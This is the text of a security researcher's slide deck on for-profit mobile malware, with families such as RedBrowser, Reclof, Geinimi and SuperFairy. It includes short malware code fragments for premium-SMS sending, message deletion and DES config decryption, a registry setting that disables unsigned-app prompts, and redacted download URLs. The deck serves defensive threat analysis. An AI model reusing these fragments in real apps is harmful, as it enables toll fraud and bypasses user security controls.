Mobile App Moolah: 
Profit taking with Mobile Malware
Jimmy Shah
Mobile Security Researcher
Mobile App Moolah: Profit taking with Mobile Malware
2
•
Who we are
•
Mobile malware
•
Modern for-profit malware
•
Examples
Contents
Mobile App Moolah: Profit taking with Mobile Malware
3
Who we are
•
Mobile Antivirus Researchers
•
My team and I specialize in mobile malware and threat analysis on 
existing(J2ME, SymbOS,WM, Apple iOS, Android) and upcoming 
mobile platforms.   
•
We work with a number of large mobile network operators.
Mobile App Moolah: Profit taking with Mobile Malware
4
Mobile Malware
In the Wild
Historical For-profit malware
Trends
Mobile App Moolah: Profit taking with Mobile Malware
5
In the Wild
SymbOS
J2ME
Android
Python
WinCE
MSIL
VBS
BlackBerry
Exploit
Linux
OSX
1200+ variants
Mobile App Moolah: Profit taking with Mobile Malware
6
Mobile Malware
In the Wild
Historical For-profit malware
Trends
Mobile App Moolah: Profit taking with Mobile Malware
7
•
What it does
– First reported J2ME trojan(2006)
– Pretends to access WAP web pages via SMS messages
– Written using the MIDletPascal programming tool
•
Profit?
– In reality, it attempts to send SMS messages to Premium Rate SMS 
numbers
– Eventually spawned a large number of J2ME malware/variants
J2ME/Redbrowser.A
RedBrowser installation prompt 
(Symbian OS, S60 UI)
“Carefully read following description of RedBrowser program 
This program allows viewing WAP pages without GPRS 
connection. RedBrowser connects to SMS server of your 
operator (MTS, BEELINE, MEGAFON). Page is loaded by 
receiving coded SMS. First 5Mb (650 SMS) of traffic are 
provided free of charge in test mode. ATTENTION!!! 
Program RedBrowser works ONLY on above mentioned cellular 
operators.” 
description text (original text in Russian)
Mobile App Moolah: Profit taking with Mobile Malware
8
J2ME/Wesber.A
•
What it does
– No GUI, almost pure for-profit J2ME trojan
– Program that disguises itself as an assistant program
– It contains two jpg files within itself.
•
Profit?
– Sends SMS to premium rate number to purchase mobile phone games.
– Presumably written to increase sales for the mobile site 
Jpg files included but not displayed to user.
Wesber installation prompt 
(Symbian OS, S60 UI)
Mobile App Moolah: Profit taking with Mobile Malware
9
Mobile Malware
In the Wild
Historical For-profit malware
Trends
Mobile App Moolah: Profit taking with Mobile Malware
10
Trends – Mobile Malware Lifecycle
R&D
Reuse
Profit Taking
Mobile App Moolah: Profit taking with Mobile Malware
11
Modern for-profit malware
For-profit malware by geographical region
How they Profit
Detection/Analysis Evasion methods
Mobile App Moolah: Profit taking with Mobile Malware
12
For-profit malware by geographical region
Mobile App Moolah: Profit taking with Mobile Malware
13
100+ variants
Primarily J2ME w/ Android
SMS sending trojans
200+ variants
J2ME, Symbian, Android
SMS trojans, privacy stealing
For-profit malware by geographical region
Mobile App Moolah: Profit taking with Mobile Malware
14
Modern for-profit malware
For-profit malware by geographical region
How they Profit
Detection/Analysis Evasion methods
Mobile App Moolah: Profit taking with Mobile Malware
15
How they profit
•
Production
– Independent malware authors
– Produce malware for sale
•
Distribution
– Forums, freeware sites, pirated software sites
Mobile App Moolah: Profit taking with Mobile Malware
16
How they profit
•
Where's the money?
– Premium Rate numbers
• Ringtones, downloads, data services/newsfeeds
Mobile App Moolah: Profit taking with Mobile Malware
17
How they profit
•
Where's the money?
– Click Fraud, Black Hat SEO
• Traffic generation, pay-per-click(PPC) ads
Mobile App Moolah: Profit taking with Mobile Malware
18
How they profit
•
Where's the money?
– Stealing, reselling PII
Mobile App Moolah: Profit taking with Mobile Malware
19
How they profit
•
Where's the money?
– SMS phishing, Injecting fake SMS
• Download malware/adware, Drive traffic
Mobile App Moolah: Profit taking with Mobile Malware
20
How they profit
•
Where's the money?
– Stealing Accounts(Skype, QQ, SIM balances)
• Using partner businesses to cash out
Mobile App Moolah: Profit taking with Mobile Malware
21
Modern for-profit malware
For-profit malware by geographical region
How they Profit
Detection/Analysis Evasion methods
Mobile App Moolah: Profit taking with Mobile Malware
22
Detection/Analysis Evasion methods
•
Infection of/Injection into clean apps
– J2ME
• Chat/IM apps
• Games
• Adult entertainment
– Symbian
• Chat/IM apps
– Android
• Games
• Chat/IM apps
Mobile App Moolah: Profit taking with Mobile Malware
23
Encryption
•
Simple
– Obfuscations
• Hiding SMS numbers/message text within plaintext HTML files
– Substitution cipher
• Config file containing encrypted SMS numbers/message text
:]cspMscomNewsBand;cspVerticalRolloverTab;cspAdControl;cspMscomVe
rticalTab;cspSilverGate" />::::241.55руб.
::::173.88руб.
::::86.00руб.
Mobile App Moolah: Profit taking with Mobile Malware
24
Encryption
•
Complex
– Symmetric cipher
• DES
• Used by Android/Geinimi to encrypt URL queries and C&C commands
• Used by Android/DrddreamLite
–  to encrypt/decrypt config file
» URLs, next connect time
– to encrypt/decrypt C&C commands
– to decrypt root exploits 
 byte abyte1[] = k.b;
 DESKeySpec deskeyspec = new DESKeySpec(abyte1);
 javax.crypto.SecretKey secretkey = SecretKeyFactory.getInstance("DES").generateSecret(deskeyspec);
 Cipher cipher = Cipher.getInstance("DES");
 b = cipher;
 cipher.init(2, secretkey);
Mobile App Moolah: Profit taking with Mobile Malware
25
Reduce security/bypass protection
•
Disable Software installation controls
– WinCE/InfoJack.A turns off the unsigned application prompt, allowing it to 
perform silent installations
•
Root vulnerabilities
– Exploits are used legitimately by users to allow modifying or reflashing new 
OS versions
– Android/DrdDream utilizes 2 root exploits to gain a foothold on android 
devices
– Android/DrddreamLite uses very similar, 1 identical, root exploits 
•
Jailbreaking
– Not In the Wild, used only in PoCs
• e.g. Eric Monti's modified jailbreak at Toorcon 2010
Key
Value
HKEY_LOCAL_MACHINE\Security\Policies\Policies\0000101a
0 = Enable Unsigned Application Prompt
1 = Disable Prompt
Mobile App Moolah: Profit taking with Mobile Malware
26
Examples of for-profit malware
J2ME
Symbian
Android
Other
Mobile App Moolah: Profit taking with Mobile Malware
27
J2ME/SMSFree
•
What it Does
– Pretends to be a variety of legitimate apps
• anonymous SMS sender
• pornographic app
• free SMS sender  
– Profit?
• Instead of the user's message it sends to a Premium Rate number
• Country specific SMS messages are sent
– Russia (5 SMS)
– Ukraine (4 SMS)
– Kazakhstan (4 SMS)
Mobile App Moolah: Profit taking with Mobile Malware
28
J2ME/Vkonpass.A
•
What it Does
– Pretends to be a mobile client for the VKontakte social network
– A phishing app, it emails the victim's account details to the attacker 
•
Profit?
– Attackers collect VKontakte user accounts
• Use trust relationships to spread malware/adware/spyware
• Resell accounts
• Blackmail users
To: 
ololoe2010yandex.ru
From: 
bork_rulsmail.ru
Subject:
:
Message: 
:
Mobile App Moolah: Profit taking with Mobile Malware
29
Examples of for-profit malware
J2ME
Symbian
Android
Other
Mobile App Moolah: Profit taking with Mobile Malware
30
SymbOS/Kiazha.A
•
What it Does
– Distributed as part of a larger collection of malware, 
SymbOS/MultiDropper.CR
– Deletes incoming and outgoing SMS messages
•
Profit?
– Displays a warning message and attempts to extort money from the user
– Money is to be transferred as the QQ coin virtual currency
Warning: Your mobile phone has been 
infected, please prepare a mobile phone 
recharge card of 50 Yuan RMB, and 
contact QQ, or your 
phone will be paralyzed!! 
Mobile App Moolah: Profit taking with Mobile Malware
31
Python/Reclof.A
•
What it Does
– Python script designed to run under the S60 Python interpreter 
– Pretends to be a Python client for ICQ
•
Profit?
– Sends SMS to premium rate number
 appswitch.switch_to_fg(u'Phone')#  
 try:messaging.sms_send('',u'FILES ')#     ,        
 except:pass#      ,  
– Deletes messages received from the same premium rate number
 new=sms.sms_messages()#  
 if len(new)!=0:#   
  keypress.simulate_key(63555,63555)#  ← Right button   
  keypress.simulate_key(63555,63555)#  ← Right Button 
  for id in new:#     
   if sms.address(id)==u'':#     
    sms.delete(id)#   
Mobile App Moolah: Profit taking with Mobile Malware
32
SymbOS/SuperFairy.A-B
•
What it does
– Adds bookmarks for a smartphone related forum
– Launches a browser to view the forum
•
Profit?
– Generate traffic to the smartphone forum
• Auto-runs an app that creates the bookmarks
http://.com:8118/client/symbian/S60v2active.txt
http://.com:8118/client/symbian/BackgroundUpdata.ini
http://.com:8118/client/symbian/S60v2StartUpdata.ini
• A second app attempts to download files from the mobile phone forum
Bookmark title
Translation
URL
 网 - 手机软件第一站
 Network - the first leg of 
mobile phone software
http://.com/?id=
智能手机大社区
Smart phone community
http://.com/?id=
手机主题免费下载
Free downloading mobile phone themes
http://com/?id=
手机游戏免费下载
Free downloading mobile phone games
http:///?id=
Mobile App Moolah: Profit taking with Mobile Malware
33
SymbOS/InSpirit.A
•
What it does
– Pretends to be “91 calls show”
•   With the “System acceleration patch”
– Injects a phishing message into the Inbox
– Text message is spoofed from a Chinese Bank
•
Profit?
– Text message directs victim to a mobile banking phishing site 
• “Dear customer,  reminds you: your account password is 